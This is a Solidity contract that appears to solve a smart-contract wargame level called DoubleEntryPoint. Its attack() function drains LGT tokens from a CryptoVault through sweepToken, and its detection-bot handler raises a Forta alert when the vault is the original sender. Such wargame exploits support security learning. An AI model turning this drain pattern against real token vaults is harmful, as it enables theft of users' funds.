// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function raiseAlert(address user) external;
}

interface ICryptoVault {
    function sweepToken(IERC20 token) external;
}

interface IDoubleEntryPoint {
    function cryptoVault() external view returns (address);

    function delegatedFrom() external view returns (address);

    function forta() external view returns (address);
}

contract DoubleEntryPointAttack is IDetectionBot {
    address owner;
    IDoubleEntryPoint doubleEntryPointContract;
    ICryptoVault cryptoVaultContract;
    IForta fortaContract;
    IERC20 LGT;
    IERC20 DET;
    uint256 public myBalanceLGT;
    uint256 public myBalanceDET;
    uint256 public vaultBalanceLGT;
    uint256 public vaultBalanceDET;

    constructor(address _targetAddress) {
        owner = msg.sender;

        doubleEntryPointContract = IDoubleEntryPoint(_targetAddress);

        cryptoVaultContract = ICryptoVault(
            doubleEntryPointContract.cryptoVault()
        );

        fortaContract = IForta(doubleEntryPointContract.forta());

        LGT = IERC20(doubleEntryPointContract.delegatedFrom());
        DET = IERC20(_targetAddress);

        myBalanceLGT = LGT.balanceOf(owner);
        myBalanceDET = DET.balanceOf(owner);

        address _cryptoVault = doubleEntryPointContract.cryptoVault();
        vaultBalanceLGT = LGT.balanceOf(_cryptoVault);
        vaultBalanceDET = DET.balanceOf(_cryptoVault);
    }

    function handleTransaction(address _user, bytes calldata _data)
        external
        override
    {
        // bytes4 selector;
        address _to;
        uint256 _value;
        address _origSender;

        // (selector) = abi.decode(_data[:4], (bytes4));
        (_to, _value, _origSender) = abi.decode(
            _data[4:],
            (address, uint256, address)
        );

        // Blocking CryptoVault contract
        if (_origSender == address(cryptoVaultContract)) {
            fortaContract.raiseAlert(_user);
        }
    }

    function attack() public {
        // Transfer the LGT tokens from vault contract to player
        cryptoVaultContract.sweepToken(LGT);

        myBalanceLGT = LGT.balanceOf(owner);
        myBalanceDET = DET.balanceOf(owner);

        address _cryptoVault = doubleEntryPointContract.cryptoVault();
        vaultBalanceLGT = LGT.balanceOf(_cryptoVault);
        vaultBalanceDET = DET.balanceOf(_cryptoVault);
    }
}
